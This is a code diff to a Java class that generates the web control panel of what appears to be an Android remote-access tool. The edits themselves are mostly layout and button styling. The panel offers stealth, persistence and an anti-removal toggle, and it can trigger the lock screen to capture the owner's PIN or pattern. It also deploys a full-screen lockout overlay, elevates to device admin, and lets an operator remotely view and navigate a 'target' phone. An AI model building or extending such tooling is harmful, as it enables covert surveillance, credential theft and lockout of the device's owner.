@@ -423,11 +423,12 @@ public class GhostModule extends BaseModule {
         html.append("</div>");
 
         // --- GHOST_UTILITIES_SECTION ---
+        html.append("<style>.ghost-utilities-grid { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 20px; width: 100%; } @media (max-width: 960px) { .ghost-utilities-grid { grid-template-columns: 1fr !important; } }</style>");
         html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
         html.append("<h2 style=\"color: var(--neon-cyan); margin: 0 0 25px 0; font-size: 1.35rem; text-align: left;\">GHOST_UTILITIES <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_UTILITIES', 'Specialized background protocols for stealth, persistence, and remote maintenance.')\">INFO</span></h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
-        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px;\">");
+        html.append("<div class=\"ghost-utilities-grid\">");
         
         // 1. Maintenance Sequences (2x2 Grid: Repair, Optimize, Inject Trust, Heal)
         html.append("<div class=\"info-item\" style=\"background: rgba(0, 242, 255, 0.03);\">");
@@ -455,8 +456,8 @@ public class GhostModule extends BaseModule {
         html.append("<div style=\"display:flex; flex-direction:column; gap:8px; margin-top: 15px;\">");
         String autoPilotLabel = IO_Persistence_Manager.isAutoPilotEngaged() ? "AUTOPILOT_ENGAGED" : "AUTOPILOT_OFF";
         String autoPilotClass = IO_Persistence_Manager.isAutoPilotEngaged() ? "btn btn-small btn-engaged-yellow" : "btn btn-small";
-        html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"width:100%; border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">").append(autoPilotLabel).append("</button>");
-        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"width:100%; border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin:0;\">LOADING...</button>");
+        html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); width: 100% !important; margin: 0;\">").append(autoPilotLabel).append("</button>");
+        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); width: 100% !important; margin: 0;\">LOADING...</button>");
         html.append("</div></div>");
 
         // 4. Blackout Mode
@@ -469,8 +470,8 @@ public class GhostModule extends BaseModule {
         html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
         html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.8rem;\">SYSTEM_LOCKS <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_LOCKS', 'Trigger instant standard OS Keyguard phone lock to capture PIN/Pattern entries, or deploy our persistent full-screen security denial overlay.')\">INFO</span></div>");
         html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px;\">");
-        html.append("<button id=\"os-lock-btn\" onclick=\"triggerOsLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); width: 100% !important; margin: 0; font-size: 0.55rem; font-weight: bold;\" title=\"Trigger Standard OS Keyguard Lock\">OS_LOCK</button>");
-        html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); width: 100% !important; margin: 0; font-size: 0.55rem; font-weight: bold;\" title=\"Toggle Full Screen Security Denial Overlay\">LOCKOUT</button>");
+        html.append("<button id=\"os-lock-btn\" onclick=\"triggerOsLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width: 100% !important; margin: 0; font-size: 0.55rem;\" title=\"Trigger Standard OS Keyguard Lock\">OS_LOCK</button>");
+        html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width: 100% !important; margin: 0; font-size: 0.55rem;\" title=\"Toggle Full Screen Security Denial Overlay\">LOCKOUT</button>");
         html.append("</div></div>");
 
         // 6. Device Admin Elevation Section
@@ -514,28 +515,26 @@ public class GhostModule extends BaseModule {
         // Dual Action Header Row
         html.append("<div style=\"display: flex; gap: 8px; width: 100%;\">");
         html.append("<button id=\"ghost-toggle-btn\" onclick=\"toggleGhostScreen()\" class=\"btn btn-small\" style=\"flex: 1; margin: 0; padding: 10px 6px; font-size: 0.7rem; font-weight: bold; border-radius: 8px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;\">INITIATE_VIEW</button>");
-        html.append("<button id=\"ghost-lock-btn\" onclick=\"toggleGhostControlLock()\" class=\"btn btn-small\" style=\"flex: 1; margin: 0; padding: 10px 6px; font-size: 0.7rem; font-weight: bold; border-radius: 8px; background: rgba(57, 255, 20, 0.08); border-color: var(--neon-green); color: var(--neon-green); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;\" title=\"Tap to Toggle Page Scroll vs Direct Target Control\">&#128994; CONTROL ACTIVE</button>");
+        html.append("<button id=\"ghost-lock-btn\" onclick=\"toggleGhostControlLock()\" class=\"btn btn-small\" style=\"flex: 1; margin: 0; padding: 10px 6px; font-size: 0.7rem; font-weight: bold; border-radius: 8px; background: rgba(57, 255, 20, 0.08); border-color: var(--neon-green); color: var(--neon-green); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;\" title=\"Tap to Toggle Page Scroll vs Direct Target Control\">&#128274; SCROLL LOCK</button>");
         html.append("</div>");
 
         // Directional Navigation & System Action Pad
         html.append("<div id=\"ghost-nav-bar\" style=\"width: 100%; display: flex; flex-direction: column; gap: 6px; background: rgba(0,0,0,0.35); padding: 10px; border-radius: 10px; border: 1px solid rgba(0, 242, 255, 0.2); box-sizing: border-box;\">");
         html.append("<div style=\"font-size: 0.6rem; color: var(--neon-cyan); text-transform: uppercase; letter-spacing: 1.5px; text-align: center; font-weight: bold; margin-bottom: 2px;\">REMOTE NAVIGATION</div>");
         
-        // Ultra-Compact D-Pad Grid
-        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 3px; width: 100%; max-width: 220px; margin: 0 auto;\">");
-        html.append("<div></div>");
-        html.append("<button type=\"button\" onclick=\"ghostScroll('up')\" class=\"btn btn-small\" style=\"width:100%; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:4px 0; font-size:0.65rem; margin:0;\" title=\"Scroll Up\">&#9650; UP</button>");
-        html.append("<div></div>");
-        html.append("<button type=\"button\" onclick=\"ghostScroll('left')\" class=\"btn btn-small\" style=\"width:100%; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:4px 0; font-size:0.65rem; margin:0;\" title=\"Swipe Left\">&#9664; LEFT</button>");
-        html.append("<button type=\"button\" onclick=\"ghostScroll('down')\" class=\"btn btn-small\" style=\"width:100%; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:4px 0; font-size:0.65rem; margin:0;\" title=\"Scroll Down\">&#9660; DOWN</button>");
-        html.append("<button type=\"button\" onclick=\"ghostScroll('right')\" class=\"btn btn-small\" style=\"width:100%; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:4px 0; font-size:0.65rem; margin:0;\" title=\"Swipe Right\">&#9654; RIGHT</button>");
+        // Ultra-Compact D-Pad Grid (Cross Layout)
+        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: auto auto; gap: 3px; width: 100%; max-width: 220px; margin: 0 auto; align-items: center;\">");
+        html.append("<button type=\"button\" onclick=\"ghostScroll('left')\" class=\"btn btn-small\" style=\"grid-column: 1; grid-row: 1 / span 2; align-self: center; width:100%; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:4px 0; font-size:0.65rem; margin:0;\" title=\"Swipe Left\">&#9664; LEFT</button>");
+        html.append("<button type=\"button\" onclick=\"ghostScroll('up')\" class=\"btn btn-small\" style=\"grid-column: 2; grid-row: 1; width:100%; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:4px 0; font-size:0.65rem; margin:0;\" title=\"Scroll Up\">&#9650; UP</button>");
+        html.append("<button type=\"button\" onclick=\"ghostScroll('down')\" class=\"btn btn-small\" style=\"grid-column: 2; grid-row: 2; width:100%; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:4px 0; font-size:0.65rem; margin:0;\" title=\"Scroll Down\">&#9660; DOWN</button>");
+        html.append("<button type=\"button\" onclick=\"ghostScroll('right')\" class=\"btn btn-small\" style=\"grid-column: 3; grid-row: 1 / span 2; align-self: center; width:100%; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:4px 0; font-size:0.65rem; margin:0;\" title=\"Swipe Right\">&#9654; RIGHT</button>");
         html.append("</div>");
 
         // Compact System Navigation Bar (Swapped: RECENT | HOME | BACK)
         html.append("<div style=\"display: flex; gap: 4px; width: 100%; margin-top: 2px;\">");
-        html.append("<button type=\"button\" onclick=\"fetch('/ghost/interact?action=recents').then(()=>showToast('RECENTS_SENT'))\" class=\"btn btn-small\" style=\"flex:1; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:6px 0; font-size:0.68rem; margin:0;\" title=\"System Recents\">&#9638; RECENT</button>");
-        html.append("<button type=\"button\" onclick=\"fetch('/ghost/interact?action=home').then(()=>showToast('HOME_SENT'))\" class=\"btn btn-small\" style=\"flex:1; border-color:var(--neon-green); color:var(--neon-green); padding:6px 0; font-size:0.68rem; margin:0;\" title=\"System Home\">&#8962; HOME</button>");
-        html.append("<button type=\"button\" onclick=\"fetch('/ghost/interact?action=back').then(()=>showToast('BACK_SENT'))\" class=\"btn btn-small\" style=\"flex:1; border-color:#ff9d00; color:#ff9d00; padding:6px 0; font-size:0.68rem; margin:0;\" title=\"System Back\">&#11013; BACK</button>");
+        html.append("<button type=\"button\" onclick=\"fetch('/ghost/interact?action=recents')\" class=\"btn btn-small\" style=\"flex:1; border-color:var(--neon-cyan); color:var(--neon-cyan); padding:6px 0; font-size:0.68rem; margin:0;\" title=\"System Recents\">&#9638; RECENT</button>");
+        html.append("<button type=\"button\" onclick=\"fetch('/ghost/interact?action=home')\" class=\"btn btn-small\" style=\"flex:1; border-color:var(--neon-green); color:var(--neon-green); padding:6px 0; font-size:0.68rem; margin:0;\" title=\"System Home\">&#8962; HOME</button>");
+        html.append("<button type=\"button\" onclick=\"fetch('/ghost/interact?action=back')\" class=\"btn btn-small\" style=\"flex:1; border-color:#ff9d00; color:#ff9d00; padding:6px 0; font-size:0.68rem; margin:0;\" title=\"System Back\">&#11013; BACK</button>");
         html.append("</div>");
         html.append("</div>"); // Close ghost-nav-bar
 
